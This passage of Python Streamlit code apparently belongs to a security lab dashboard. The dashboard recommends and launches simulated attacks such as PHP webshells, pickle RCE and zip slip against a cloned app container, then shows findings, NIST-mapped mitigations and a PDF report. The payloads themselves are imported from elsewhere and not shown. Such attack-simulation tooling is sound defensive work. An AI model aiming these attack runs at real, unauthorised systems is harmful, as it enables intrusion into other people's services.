    _SAMPLE_BY_KEY = {s["key"]: s for s in _LAB_SAMPLES}

    # Build the recommendation card HTML
    _rec_chips = ""
    for i, (atk_key, why) in enumerate(_recs[:4], start=1):
        s = _SAMPLE_BY_KEY.get(atk_key)
        if not s:
            continue
        _ran  = bool(state.get(f"lab_log_{atk_key}"))
        _badge = "✓ DONE" if _ran else f"#{i}"
        _badge_c = "#16A34A" if _ran else "#0284C7"
        _rec_chips += (
            f'<div style="background:#FFFFFF;border:1px solid {s["border"]};'
            f'border-left:3px solid {s["color"]};border-radius:7px;padding:7px 10px;'
            f'margin-bottom:5px;display:flex;align-items:center;gap:9px">'
            f'<span style="background:{_badge_c};color:#FFFFFF;font-family:JetBrains Mono,monospace;'
            f'font-size:0.55rem;font-weight:700;border-radius:6px;padding:2px 7px;'
            f'min-width:38px;text-align:center">{_badge}</span>'
            f'<span style="font-size:0.95rem;line-height:1">{s["icon"]}</span>'
            f'<span style="font-family:Inter,sans-serif;font-size:0.72rem;font-weight:700;'
            f'color:{s["color"]};white-space:nowrap">{s["label"]}</span>'
            f'<span style="font-family:Inter,sans-serif;font-size:0.66rem;color:#64748B;'
            f'flex:1;min-width:0;line-height:1.4">→ {why}</span>'
            f'</div>'
        )

    st.html(
        '<div style="background:linear-gradient(135deg,#FAF5FF,#EFF6FF);'
        'border:1.5px solid #C7D2FE;border-radius:11px;padding:12px 14px;'
        'margin-bottom:12px;box-shadow:0 2px 8px -3px rgba(99,102,241,0.15)">'
        '<div style="display:flex;align-items:center;justify-content:space-between;'
        'margin-bottom:8px;gap:10px">'
        '<div style="font-family:Inter,sans-serif;font-size:0.82rem;font-weight:700;'
        'color:#4338CA;letter-spacing:0.02em">'
        '🎯 RECOMMENDED FOR YOUR CLONE'
        '</div>'
        f'<span style="font-family:JetBrains Mono,monospace;font-size:0.6rem;'
        f'font-weight:700;color:#4338CA;background:#FFFFFF;border:1px solid #C7D2FE;'
        f'padding:3px 9px;border-radius:6px">'
        f'Detected: <b>{_summary}</b></span>'
        '</div>'
        + _rec_chips +
        '<div style="font-family:Inter,sans-serif;font-size:0.65rem;color:#6366F1;'
        'margin-top:5px;font-style:italic">'
        'Recommendations driven by clone\'s file profile — different cloned apps get different attack ranks.'
        '</div>'
        '</div>'
    )

    # Big "Run Recommended Pack" button — runs the top-4 attacks in sequence
    _pack_keys = [k for k, _w in _recs[:4] if k in _SAMPLE_BY_KEY]
    if _pack_keys:
        _br1, _br2 = st.columns([1.8, 1])
        with _br1:
            if st.button(f"🚀 Run Recommended Pack  ({len(_pack_keys)} attacks)",
                          key="lab_run_pack", type="primary", use_container_width=True,
                          help="Runs the top-ranked attacks back-to-back"):
                for _pk in _pack_keys:
                    _run_live_lab(_pk, result, state)
                state["_focused_attack"] = _pack_keys[-1]
                st.rerun()
        with _br2:
            st.markdown(
                f'<div style="padding-top:6px;font-family:Inter,sans-serif;font-size:0.7rem;'
                f'color:#64748B;line-height:1.5">Stack: <b style="color:#7C3AED">{_eco}</b> · '
                f'Or pick individually below ↓</div>',
                unsafe_allow_html=True,
            )

    # ── v30: per-attack stack-fitness map ──────────────────────────
    # Each card gets one of three states based on the detected ecosystem:
    #   "match"     — attack is in the top-4 recommended list (strong fit)
    #   "stack"     — attack works on this stack but isn't top-ranked
    #   "universal" — attack is stack-agnostic (EICAR, PE, Macro, etc)
    _reco_keys = set(k for k, _ in _recs)
    _STACK_SPECIFIC = {
        "php_webshell":       {"php"},
        "php_dropper":        {"php"},
        "path_traversal":     {"php", "python", "node"},
        "file_upload_exploit":{"php", "node", "python"},
        "header_injection":   {"java", "node", "php", "python"},
        "pickle_rce":         {"python"},
        "zip_slip":           {"java", "python", "node"},
        "pdf_js":             {"static", "mixed", "php", "python", "node", "java"},
        # Universal — works regardless of clone ecosystem
        "eicar":              set(),   # empty = universal
        "gtube":              set(),
        "lolbin":             set(),
        "pe_anomaly":         set(),
        "macro_doc":          set(),
        "yara_test":          set(),
    }
    def _stack_chip(atk_key: str) -> str:
        fit_eco = _STACK_SPECIFIC.get(atk_key, set())
        if atk_key in _reco_keys:
            # Top-ranked → strongest chip
            return (
                '<span style="font-family:JetBrains Mono,monospace;font-size:0.5rem;'
                'font-weight:700;color:#FFFFFF;background:#7C3AED;border-radius:5px;'
                'padding:2px 7px;letter-spacing:0.08em;white-space:nowrap">'
                '⚡ TOP MATCH</span>'
            )
        if fit_eco and _eco in fit_eco:
            # Stack works but not top-ranked
            return (
                '<span style="font-family:JetBrains Mono,monospace;font-size:0.5rem;'
                'font-weight:700;color:#7C3AED;background:#F3E8FF;border:1px solid #C4B5FD;'
                f'border-radius:5px;padding:1px 6px;letter-spacing:0.08em;white-space:nowrap">'
                f'✓ FITS {_eco.upper()}</span>'
            )
        if not fit_eco:
            # Universal
            return (
                '<span style="font-family:JetBrains Mono,monospace;font-size:0.5rem;'
                'font-weight:700;color:#0369A1;background:#E0F2FE;border:1px solid #7DD3FC;'
                'border-radius:5px;padding:1px 6px;letter-spacing:0.08em;white-space:nowrap">'
                '○ UNIVERSAL</span>'
            )
        # Stack-specific but doesn't match
        return (
            '<span style="font-family:JetBrains Mono,monospace;font-size:0.5rem;'
            'font-weight:700;color:#64748B;background:#F1F5F9;border:1px solid #CBD5E1;'
            f'border-radius:5px;padding:1px 6px;letter-spacing:0.08em;white-space:nowrap">'
            f'△ adapts</span>'
        )

    # ── v31: HIDE-AND-SCROLL catalog ────────────────────────────────
    # 13 attack cards used to eat the full page. Now they live behind a
    # collapsible "Browse" header + a category filter — recommended pack
    # stays visible up top, full catalog is opt-in scroll.
    _ran_keys = {s["key"] for s in _LAB_SAMPLES if state.get(f"lab_log_{s['key']}")}
    _filter_options = ["⚡ Top Match", "○ Universal", "✓ Stack Fit",
                        "🔴 Already Run", "All"]
    # Default state — show only the catalog header (collapsed)
    _show_catalog = state.get("_show_catalog", False)

    _cat_c1, _cat_c2 = st.columns([2.2, 5])
    with _cat_c1:
        _toggle_label = ("📚 Hide Catalog" if _show_catalog
                          else f"📚 Browse Attack Catalog ({len(_LAB_SAMPLES)})")
        if st.button(_toggle_label, key="lab_toggle_catalog",
                      type="secondary", use_container_width=True,
                      help="Show or hide the full attack catalog"):
            _ss_t = st.session_state.setdefault("dt_state", {})
            _ss_t["_show_catalog"] = not _show_catalog
            st.rerun()
    with _cat_c2:
        st.markdown(
            f'<div style="padding-top:9px;font-family:Inter,sans-serif;font-size:0.7rem;'
            f'color:#64748B;line-height:1.4">'
            f'<b style="color:#7C3AED">{len(_recs[:4])} top-ranked above</b> · '
            f'click <b>Browse</b> to see all {len(_LAB_SAMPLES)} attack types '
            f'(filter chips inside)</div>',
            unsafe_allow_html=True,
        )

    if _show_catalog:
        # Filter chips — radio buttons styled as pills
        _cur_filter = state.get("_catalog_filter", "⚡ Top Match")
        _filter_pick = st.radio(
            "Filter",
            options=_filter_options,
            index=_filter_options.index(_cur_filter) if _cur_filter in _filter_options else 0,
            horizontal=True,
            key="lab_catalog_filter",
            label_visibility="collapsed",
        )
        if _filter_pick != _cur_filter:
            _ss_f = st.session_state.setdefault("dt_state", {})
            _ss_f["_catalog_filter"] = _filter_pick

        # Apply filter
        if _filter_pick == "⚡ Top Match":
            _filtered = [s for s in _LAB_SAMPLES if s["key"] in _reco_keys]
        elif _filter_pick == "○ Universal":
            _filtered = [s for s in _LAB_SAMPLES
                          if not _STACK_SPECIFIC.get(s["key"], set())]
        elif _filter_pick == "✓ Stack Fit":
            _filtered = [s for s in _LAB_SAMPLES
                          if _eco in _STACK_SPECIFIC.get(s["key"], set())]
        elif _filter_pick == "🔴 Already Run":
            _filtered = [s for s in _LAB_SAMPLES if s["key"] in _ran_keys]
        else:  # All
            _filtered = list(_LAB_SAMPLES)

        # Stat strip
        st.html(
            f'<div style="display:flex;align-items:center;gap:8px;margin:4px 0 8px;'
            f'font-family:JetBrains Mono,monospace;font-size:0.62rem;color:#475569">'
            f'<span style="background:#F1F5F9;border:1px solid #CBD5E1;border-radius:5px;'
            f'padding:3px 9px;font-weight:700">Showing {len(_filtered)} / {len(_LAB_SAMPLES)}</span>'
            f'<span style="opacity:0.7">{_filter_pick} filter applied</span>'
            f'</div>'
        )

        # Cap the catalog height with a styled scroll-container marker —
        # the inner Streamlit columns aren't directly scrollable so we
        # wrap them inside a fixed-height container with overflow-y.
        # Use a unique data attribute so our CSS scope is tight.
        st.html(
            '<style>'
            '[data-aidtctm-catalog="1"]{'
              'max-height:520px;overflow-y:auto;'
              'border:1px solid #E2E8F0;border-radius:10px;'
              'padding:8px;background:#FAFBFC;'
              'box-shadow:inset 0 1px 0 rgba(15,23,42,0.02)}'
            '[data-aidtctm-catalog="1"]::-webkit-scrollbar{width:8px}'
            '[data-aidtctm-catalog="1"]::-webkit-scrollbar-thumb{'
              'background:#94A3B8;border-radius:4px}'
            '[data-aidtctm-catalog="1"]::-webkit-scrollbar-track{'
              'background:#F1F5F9;border-radius:4px}'
            # JS: tag the next Streamlit container with our data attribute
            # so the CSS picks it up without affecting anything else.
            '</style>'
            '<script>'
            '(function(){'
            'const t=document.currentScript;'
            'const next=t&&t.parentElement&&t.parentElement.nextElementSibling;'
            'if(next)next.setAttribute("data-aidtctm-catalog","1");'
            '})();'
            '</script>'
        )

        if not _filtered:
            st.info(f"No attacks match the '{_filter_pick}' filter for this clone.")
    # When catalog is open and has matches, feed the existing grid below.
    # When closed, feed empty so the grid doesn't render at all.
    _grid_list = _filtered if (_show_catalog and _filtered) else []

    for row_start in range(0, len(_grid_list), 2):
        row_pair = _grid_list[row_start : row_start + 2]
        col_a, col_b = st.columns(2, gap="medium")

        for col, s in zip((col_a, col_b), row_pair):
            with col:
                _key   = s["key"]
                _log   = state.get(f"lab_log_{_key}", [])
                _crits = sum(1 for e in _log if e.get("status") == "crit")
                _done  = bool(_log)

                # ── Status badge for this attack ────────────────────
                if _done:
                    _badge_color = "#DC2626" if _crits else "#16A34A"
                    _badge_text  = (f"🔴 {_crits} FINDINGS" if _crits
                                    else "🟢 NO FINDINGS")
                else:
                    _badge_color = "#64748B"
                    _badge_text  = "⬜ NOT RUN"

                # ── Attack card (v24: collapsible "WHY THIS ATTACK?") ──
                _why_text = s.get("why", "")
                # Native <details> = pure-CSS collapsible, no Streamlit rerun.
                # Closed by default → card stays compact. User clicks the
                # chevron strip to expand and read the explanation.
                _why_html = ""
                if _why_text:
                    _why_html = (
                        f'<details style="margin-top:8px;background:rgba(0,0,0,0.04);'
                        f'border-left:3px solid {s["border"]};border-radius:0 6px 6px 0;'
                        f'padding:0">'
                        f'<summary style="cursor:pointer;list-style:none;'
                        f'padding:6px 10px;font-family:Inter,sans-serif;font-size:0.66rem;'
                        f'font-weight:700;color:{s["color"]};letter-spacing:0.04em;'
                        f'display:flex;align-items:center;justify-content:space-between;'
                        f'user-select:none;-webkit-user-select:none">'
                        f'<span>▸ WHY THIS ATTACK?</span>'
                        f'<span style="font-family:JetBrains Mono,monospace;font-size:0.55rem;'
                        f'font-weight:600;color:#94A3B8;letter-spacing:0.06em">'
                        f'click to expand</span>'
                        f'</summary>'
                        f'<div style="padding:0 10px 8px;'
                        f'font-family:Inter,sans-serif;font-size:0.7rem;color:#374151;'
                        f'line-height:1.65">{_why_text}</div>'
                        f'</details>'
                        # Hide default marker in webkit & rotate our chevron on open
                        f'<style>'
                        f'details > summary::-webkit-details-marker {{display:none}}'
                        f'details[open] > summary > span:first-child::before {{'
                        f'content:"▾ "; margin-right:0}}'
                        f'details:not([open]) > summary > span:first-child {{}}'
                        f'</style>'
                    )

                # v27/30: icon shrunk + label inline + run-status chip +
                # v30 stack-fitness chip (TOP MATCH / FITS X / UNIVERSAL)
                _stack_html = _stack_chip(_key)
                st.html(
                    f'<div style="background:{s["bg"]};border:1.5px solid {s["border"]};'
                    f'border-radius:9px;padding:9px 12px;margin-bottom:5px">'
                    f'<div style="display:flex;align-items:center;gap:6px;flex-wrap:wrap">'
                    f'<span style="font-size:1.0rem;line-height:1">{s["icon"]}</span>'
                    f'<span style="font-family:Inter,sans-serif;font-size:0.78rem;'
                    f'font-weight:700;color:{s["color"]};flex:1;min-width:0">{s["label"]}</span>'
                    f'{_stack_html}'
                    f'<span style="font-family:JetBrains Mono,monospace;font-size:0.55rem;'
                    f'font-weight:700;color:{_badge_color};background:{_badge_color}14;'
                    f'border:1px solid {_badge_color}44;border-radius:9px;padding:2px 7px;'
                    f'white-space:nowrap">{_badge_text}</span>'
                    f'</div>'
                    f'<div style="font-family:Inter,sans-serif;font-size:0.7rem;color:#475569;'
                    f'line-height:1.45;margin-top:5px">{s["desc"]}</div>'
                    + _why_html
                    + f'</div>'
                )

                # ── Buttons ─────────────────────────────────────────
                b1, b2 = st.columns([3, 2])
                with b1:
                    if st.button(
                        "▶ Run Attack" if not _done else "↺ Re-run",
                        key=f"lab_{_key}",
                        type="primary",
                        use_container_width=True,
                    ):
                        _run_live_lab(_key, result, state)

                with b2:
                    if _done and st.button("✕ Clear", key=f"lab_clear_{_key}",
                                           use_container_width=True):
                        state.pop(f"lab_log_{_key}", None)
                        st.rerun()

                with st.expander("📋 View Attack Code", expanded=False):
                    _variants = _AV.get(_key, [])
                    if _variants:
                        _v_labels = [v["label"] for v in _variants]
                        _v_sel = st.radio(
                            "Variant",
                            options=range(len(_v_labels)),
                            format_func=lambda i: _v_labels[i],
                            key=f"lab_vsel_{_key}",
                            label_visibility="collapsed",
                        )
                        st.code(_variants[_v_sel]["code"], language="python")
                    else:
                        st.code(_LAB_CODE.get(_key, "# code not available"), language="python")

                # ── Per-attack inline console ───────────────────────
                if _log:
                    _phase_order = {"pre": 0, "inject": 1, "exec": 2, "http": 3, "detect": 4, "post": 5, "summary": 6}
                    _phase_label = {
                        "pre":     "BEFORE",
                        "inject":  "INJECT",
                        "exec":    "EXEC",
                        "http":    "HTTP",
                        "detect":  "DETECT",
                        "post":    "AFTER",
                        "summary": "DONE",
                    }
                    _phase_color = {
                        "pre":     "#64748B",
                        "inject":  "#7C3AED",
                        "exec":    "#DC2626",
                        "http":    "#0284C7",
                        "detect":  "#D97706",
                        "post":    "#059669",
                        "summary": "#16A34A",
                    }
                    # v25: use the SAME light-theme renderer used during live
                    # streaming so STEP labels + content stay properly aligned.
                    # Group events by phase for numbered display.
                    _current_phase = ""
                    _step = 0
                    _rows_html = []
                    for ev in _log:
                        ph    = ev.get("phase", "info")
                        ph_lbl= _phase_label.get(ph, ph.upper())
                        if ph != _current_phase:
                            _current_phase = ph
                            _step += 1
                            _ph_c = _phase_color.get(ph, "#64748B")
                            _rows_html.append(
                                f'<div style="display:flex;align-items:center;gap:8px;'
                                f'padding:10px 10px 4px;margin-top:8px">'
                                f'<span style="font-family:JetBrains Mono,monospace;font-size:0.65rem;'
                                f'font-weight:700;color:{_ph_c};background:{_ph_c}28;'
                                f'border:1px solid {_ph_c}66;border-radius:10px;'
                                f'padding:3px 12px;letter-spacing:0.12em">STEP {_step} · {ph_lbl}</span>'
                                f'<span style="flex:1;height:1px;background:{_ph_c}44"></span>'
                                f'</div>'
                            )
                        # Use the same well-tested renderer from streaming
                        _rows_html.append(_lab_event_html(ev))

                    # v27: st.html — raw render, no markdown auto-paragraph
                    st.html(
                        '<div style="background:#FFFFFF;border:1px solid #E2E8F0;'
                        'border-radius:10px;padding:10px;margin-top:8px;'
                        'max-height:520px;overflow-y:auto;'
                        'box-shadow:inset 0 1px 0 rgba(15,23,42,0.02)">'
                        + "".join(_rows_html)
                        + '</div>'
                    )

                    # ── Clone Impact Summary ─────────────────────────
                    _pre_evts  = [e for e in _log if e.get("phase") == "pre"]
                    _post_evts = [e for e in _log if e.get("phase") == "post"]
                    _inj_evts  = [e for e in _log if e.get("phase") == "inject"
                                  and e.get("status") == "ok"]
                    if _post_evts:
                        _post_detail = _post_evts[-1].get("detail", "")
                        _inj_paths   = _inj_evts[0].get("detail", "").strip() if _inj_evts else ""
                        _has_new     = "NEW FILES" in _post_detail
                        _compromised = _crits > 0 or _has_new
                        _ic = "#DC2626" if _compromised else "#16A34A"
                        _ib = "#FEF2F2" if _compromised else "#F0FDF4"
                        _it = "🔴 CLONE COMPROMISED" if _compromised else "🟢 CLONE RESILIENT"
                        _verdict_label = (
                            f"{_crits} critical finding(s) · filesystem changed"
                            if _compromised else "no critical findings · filesystem unchanged"
                        )
                        # v26: compact — short inline file count + verbose
                        # diff tucked into a native <details>; box no longer
                        # eats 20cm of vertical space per attack.
                        _impact_body = ""
                        _file_lines = [l.strip() for l in (_inj_paths or "").splitlines() if l.strip().startswith("/")]
                        _file_lines = list(dict.fromkeys(_file_lines))[:6]
                        if _file_lines:
                            _files_inline = " &nbsp;·&nbsp; ".join(
                                f'<code style="font-size:0.66rem;color:#7C3AED">{p}</code>'
                                for p in _file_lines[:3]
                            )
                            _more = (f' <span style="color:#94A3B8;font-size:0.6rem">'
                                      f'+{len(_file_lines)-3} more</span>'
                                      if len(_file_lines) > 3 else "")
                            _impact_body += (
                                f'<div style="font-family:Inter,sans-serif;font-size:0.68rem;'
                                f'color:#475569;margin:5px 0 2px;line-height:1.6">'
                                f'<span style="font-family:JetBrains Mono,monospace;font-size:0.58rem;'
                                f'font-weight:700;color:#7C3AED;letter-spacing:0.1em;'
                                f'margin-right:7px">DROPPED</span>'
                                f'{_files_inline}{_more}'
                                f'</div>'
                            )
                        if _post_detail and "NEW FILES" in _post_detail:
                            _impact_body += (
                                f'<details style="margin-top:5px">'
                                f'<summary style="font-family:JetBrains Mono,monospace;'
                                f'font-size:0.6rem;font-weight:700;color:{_ic};'
                                f'letter-spacing:0.08em;cursor:pointer;outline:none">'
                                f'▸ BEFORE &rarr; AFTER snapshot diff</summary>'
                                f'<pre style="font-family:JetBrains Mono,monospace;font-size:0.64rem;'
                                f'color:#374151;white-space:pre-wrap;margin:5px 0 0;'
                                f'background:#00000012;padding:5px 8px;border-radius:4px;'
                                f'max-height:120px;overflow:auto">{_post_detail[:600]}</pre>'
                                f'</details>'
                            )
                        st.markdown(
                            f'<div style="background:{_ib};border:2px solid {_ic}55;'
                            f'border-radius:8px;padding:10px 14px;margin-top:8px">'
                            f'<div style="display:flex;justify-content:space-between;align-items:center">'
                            f'<span style="font-family:JetBrains Mono,monospace;font-size:0.72rem;'
                            f'font-weight:700;color:{_ic}">{_it}</span>'
                            f'<span style="font-family:Inter,sans-serif;font-size:0.65rem;'
                            f'color:#64748B">{_verdict_label}</span>'
                            f'</div>'
                            + _impact_body
                            + '</div>',
                            unsafe_allow_html=True,
                        )

        st.markdown("<div style='height:6px'></div>", unsafe_allow_html=True)

    # ── Global summary bar (all attacks combined) ───────────────────
    all_logs = []
    for s in _LAB_SAMPLES:
        all_logs.extend(state.get(f"lab_log_{s['key']}", []))
    total_crits = sum(1 for e in all_logs if e.get("status") == "crit")
    ran = sum(1 for s in _LAB_SAMPLES if state.get(f"lab_log_{s['key']}"))
    if ran:
        sc = "#DC2626" if total_crits else "#16A34A"
        st.markdown(
            f'<div style="background:{sc}14;border:1px solid {sc}44;border-radius:8px;'
            f'padding:8px 16px;font-family:Inter,sans-serif;font-size:0.78rem;margin-top:6px">'
            f'<b style="color:{sc}">{ran}/6 attacks run · {total_crits} CRITICAL findings total</b>'
            + (' — ⚡ clone is compromised!' if total_crits else ' — ✓ no critical issues found')
            + '</div>',
            unsafe_allow_html=True,
        )
        if st.button("✕ Clear all attack logs", key="lab_clear_all"):
            for s in _LAB_SAMPLES:
                state.pop(f"lab_log_{s['key']}", None)
            st.rerun()

        # ── v33: MITIGATION PIPELINE (replaces OWASP coverage map) ──
        # User asks: "OWASP map venuma iella, anga mitigation option vekkalam".
        # Show every run attack as a pipeline row: Attack → Mitigation status
        # → Verify status. One-click "Apply All" runs mitigations sequentially.
        _MIT_CONTROL = {
            "eicar":              ("SI-3", "Content-hash quarantine"),
            "gtube":              ("SI-3", "Content-hash quarantine"),
            "php_webshell":       ("AC-3", "Apache .htaccess deny + RewriteCond"),
            "php_dropper":        ("AC-3", "Deny PHP + content quarantine"),
            "path_traversal":     ("SC-7", "PHP open_basedir + disable_functions"),
            "header_injection":   ("SI-10", "Apache mod_rewrite WAF rules"),
            "file_upload_exploit":("SI-10", "Upload-dir engine off + extension allowlist"),
            "pickle_rce":         ("SC-39", "Safe-pickle wrapper sitecustomize"),
            "zip_slip":           ("SI-3", "Generic quarantine + path sanitiser"),
            "pdf_js":             ("SI-3", "JS-stripper + quarantine"),
            "pe_anomaly":         ("SI-3", "Hash quarantine"),
            "macro_doc":          ("SI-3", "Hash quarantine"),
            "lolbin":             ("SI-3", "Behaviour-rule quarantine"),
            "yara_test":          ("SI-3", "YARA rule self-check"),
        }
        _run_samples = [s for s in _LAB_SAMPLES
                         if state.get(f"lab_log_{s['key']}")]
        if _run_samples:
            _pipeline_rows = ""
            for s in _run_samples:
                _k = s["key"]
                _log = state.get(f"lab_log_{_k}", [])
                _atk_crits = sum(1 for e in _log if e.get("status") == "crit")
                _mit_log = state.get(f"mit_log_{_k}", [])
                _mitigated = bool(_mit_log)
                _verified  = any(e.get("phase") == "verify"
                                  and e.get("status") == "ok"
                                  for e in _mit_log)
                _ctrl, _ctrl_label = _MIT_CONTROL.get(_k, ("—", "—"))

                # Pipeline cell states
                _atk_c = "#DC2626" if _atk_crits else "#16A34A"
                _atk_t = f"⚡ {_atk_crits} hits" if _atk_crits else "✓ no hits"
                if _verified:
                    _mit_c = "#16A34A"; _mit_t = "✅ DEFENSE HELD"
                elif _mitigated:
                    _mit_c = "#D97706"; _mit_t = "▶ APPLIED · unverified"
                else:
                    _mit_c = "#64748B"; _mit_t = "○ NOT APPLIED"

                _pipeline_rows += (
                    f'<div style="display:grid;grid-template-columns:auto 1fr auto 1fr auto;'
                    f'gap:8px;align-items:center;padding:9px 11px;background:#FFFFFF;'
                    f'border:1px solid #E2E8F0;border-left:4px solid {_atk_c};'
                    f'border-radius:7px;margin-bottom:6px">'
                    # Attack name + icon
                    f'<div style="display:flex;align-items:center;gap:7px;min-width:0">'
                    f'<span style="font-size:1rem">{s["icon"]}</span>'
                    f'<div style="min-width:0">'
                    f'<div style="font-family:Inter,sans-serif;font-size:0.72rem;'
                    f'font-weight:700;color:{s["color"]};white-space:nowrap;'
                    f'text-overflow:ellipsis;overflow:hidden">{s["label"]}</div>'
                    f'<div style="font-family:JetBrains Mono,monospace;font-size:0.55rem;'
                    f'color:{_atk_c};font-weight:700">{_atk_t}</div>'
                    f'</div></div>'
                    # Pipeline arrow
                    f'<div style="font-family:JetBrains Mono,monospace;font-size:0.62rem;'
                    f'color:#94A3B8;text-align:center">▸▸</div>'
                    # Mitigation control + status
                    f'<div style="text-align:right;min-width:0">'
                    f'<div style="font-family:JetBrains Mono,monospace;font-size:0.55rem;'
                    f'color:#7C3AED;font-weight:700;letter-spacing:0.1em">'
                    f'NIST {_ctrl}</div>'
                    f'<div style="font-family:Inter,sans-serif;font-size:0.62rem;'
                    f'color:#475569;line-height:1.3">{_ctrl_label}</div>'
                    f'</div>'
                    # Verify status badge
                    f'<div style="text-align:center">'
                    f'<span style="font-family:JetBrains Mono,monospace;font-size:0.58rem;'
                    f'font-weight:700;color:{_mit_c};background:{_mit_c}14;'
                    f'border:1px solid {_mit_c}55;border-radius:5px;padding:3px 9px;'
                    f'letter-spacing:0.08em;white-space:nowrap">{_mit_t}</span>'
                    f'</div>'
                    # Run mitigation button slot — handled below via Streamlit
                    f'<div data-mit-slot="{_k}" style="min-width:80px"></div>'
                    f'</div>'
                )
            _n_mitigated = sum(
                1 for s in _run_samples
                if state.get(f"mit_log_{s['key']}", [])
            )
            st.html(
                '<div style="margin-top:14px">'
                '<div style="display:flex;align-items:center;justify-content:space-between;'
                'gap:10px;margin-bottom:9px">'
                '<div style="font-family:Inter,sans-serif;font-size:0.82rem;font-weight:700;'
                'color:#1E40AF;letter-spacing:0.02em">'
                '🛡 MITIGATION PIPELINE — attack → defense → verify'
                '</div>'
                f'<span style="font-family:JetBrains Mono,monospace;font-size:0.6rem;'
                f'font-weight:700;color:#1E40AF;background:#FFFFFF;border:1px solid #BFDBFE;'
                f'padding:3px 9px;border-radius:6px">'
                f'{_n_mitigated}/{len(_run_samples)} mitigated</span>'
                '</div>'
                + _pipeline_rows +
                '<div style="font-family:Inter,sans-serif;font-size:0.6rem;color:#94A3B8;'
                'margin-top:6px;font-style:italic">'
                'Each row shows one run attack. Click <b>Apply</b> beside any row to install '
                'the matching NIST 800-53 defense, then auto-verify by re-running the attack.'
                '</div>'
                '</div>'
            )
            # Streamlit-native "Apply" buttons per row (the HTML pipeline
            # above shows status only; this row hosts the action triggers)
            _pp_cols = st.columns(min(len(_run_samples), 4))
            for _i, _s in enumerate(_run_samples):
                _k = _s["key"]
                _mitigated = bool(state.get(f"mit_log_{_k}"))
                with _pp_cols[_i % len(_pp_cols)]:
                    if not _mitigated:
                        if st.button(
                            f"🛡 Apply · {_s['icon']}",
                            key=f"mit_pipe_{_k}",
                            use_container_width=True,
                            help=f"Install {_MIT_CONTROL.get(_k,('—','—'))[1]} "
                                  f"defense for {_s['label']} and verify",
                        ):
                            _run_mitigation_stream(_k, result, state)
                            st.rerun()
                    else:
                        st.button(
                            f"✅ {_s['icon']}",
                            key=f"mit_pipe_done_{_k}",
                            disabled=True,
                            use_container_width=True,
                            help="Already mitigated — see stream above",
                        )

        # ── PDF Report Download ─────────────────────────────────────
        st.markdown("<div style='height:8px'></div>", unsafe_allow_html=True)
        try:
            from core.pdf_report_generator import generate_dt_report
            _attack_logs_for_pdf = {
                s["key"]: state.get(f"lab_log_{s['key']}", [])
                for s in _LAB_SAMPLES
                if state.get(f"lab_log_{s['key']}")
            }
            if _attack_logs_for_pdf:
                _pdf_buf = generate_dt_report(
                    target_url=result.get("url",""),
                    stack=result.get("stack",{}),
                    attack_logs=_attack_logs_for_pdf,
                    clone_id=result.get("clone_id",""),
                )
                if _pdf_buf:
                    _fname = f"dt_report_{result.get('clone_id','twin')}_{int(time.time())}.pdf"
                    st.download_button(
                        label="📄 Download PDF Security Report",
                        data=_pdf_buf,
                        file_name=_fname,
                        mime="application/pdf",
                        key="lab_pdf_download",
                        help="Professional PDF report with OWASP coverage, attack findings & recommendations",
                    )
        except Exception:
            pass


def _run_live_lab(sample_key: str, result: dict, state: dict) -> None:
    """
    Stream live attack events → store per-attack in state[lab_log_{key}].
    v24: self-contained header card + clean light-theme event rows so
    the HTML structure stays valid across multiple st.markdown calls.
    """
    from core.live_malware_lab import run_live_attack, SAMPLES
    clone_id = result.get("clone_id", "")
    url      = result.get("url", "")
    stack    = result.get("stack", {})
    label    = SAMPLES.get(sample_key, {}).get("label", sample_key)
    log_key  = f"lab_log_{sample_key}"

    state[log_key] = []

    # ── SELF-CONTAINED HEADER CARD ──────────────────────────────────
    # Single closed <div> — no unclosed structure that could leak.
    target_short = (url or clone_id or "container")[:60]
    target_safe = target_short.replace("<", "&lt;").replace(">", "&gt;")
    label_safe = label.replace("<", "&lt;").replace(">", "&gt;")
    lang_safe = stack.get("language", "?").replace("<", "&lt;").replace(">", "&gt;")
    fwk_safe = stack.get("framework", "?").replace("<", "&lt;").replace(">", "&gt;")
    clone_safe = clone_id.replace("<", "&lt;").replace(">", "&gt;")

    st.markdown(
        '<style>'
        '@keyframes lab-blink { 0%,49%{opacity:1} 50%,100%{opacity:0} }'
        '.lab-cursor { animation: lab-blink 1s steps(2) infinite; display:inline-block; }'
        '</style>'
        '<div style="background:linear-gradient(135deg,#EFF6FF,#FAF5FF);'
        'border:1px solid #BFDBFE;border-left:4px solid #2563EB;border-radius:10px;'
        'padding:11px 16px;margin:10px 0 8px;'
        'box-shadow:0 2px 8px -2px rgba(37,99,235,0.12)">'
        '<div style="display:flex;align-items:center;justify-content:space-between;gap:10px;'
        'margin-bottom:6px">'
        f'<div style="font-family:Inter,sans-serif;font-size:0.85rem;font-weight:700;color:#1E40AF">'
        f'🧬 Live attack running · <span style="color:#7C3AED">{label_safe}</span>'
        f'</div>'
        '<span style="font-family:JetBrains Mono,monospace;font-size:0.62rem;font-weight:700;'
        'color:#16A34A;background:#FFFFFF;border:1px solid #BBF7D0;padding:3px 9px;'
        'border-radius:6px;display:flex;align-items:center;gap:6px">'
        '<span style="width:7px;height:7px;border-radius:50%;background:#16A34A;'
        'box-shadow:0 0 6px #16A34A" class="lab-cursor"></span>'
        'LIVE</span>'
        '</div>'
        f'<div style="font-family:JetBrains Mono,monospace;font-size:0.7rem;color:#475569;'
        f'line-height:1.55">'
        f'Target: <code style="background:#FFFFFF;border:1px solid #DBEAFE;padding:1px 6px;'
        f'border-radius:4px;color:#1E40AF">{target_safe}</code>'
        f' · Stack: <b style="color:#7C3AED">{lang_safe}/{fwk_safe}</b>'
        f' · Mode: <b style="color:#0F172A">docker exec + HTTP</b>'
        f'</div>'
        f'<div style="font-family:JetBrains Mono,monospace;font-size:0.65rem;color:#16A34A;'
        f'margin-top:4px"><span style="color:#1E40AF">▸</span> Channel to '
        f'<span style="color:#7C3AED">{clone_safe}</span> established '
        f'<span class="lab-cursor" style="color:#16A34A;font-weight:700">█</span></div>'
        '</div>',
        unsafe_allow_html=True,
    )

    with st.status(
        f"🧬 {label} — running against clone…",
        expanded=True,
    ) as _status:
        # v26: buffer ALL events into a single placeholder rendered as one
        # markdown call — Streamlit's markdown parser then sees exactly ONE
        # HTML chunk per refresh, so no per-event </span><div> leakage.
        _stream_slot = st.empty()
        _ev_html: list[str] = []
        _current_phase: str | None = None
        _step_n = 0
        _phase_color = {
            "pre":"#7C3AED","inject":"#DC2626","exec":"#0EA5E9",
            "http":"#0284C7","detect":"#16A34A","post":"#7C3AED",
            "summary":"#16A34A","react":"#F59E0B","info":"#64748B",
        }
        _phase_label = {
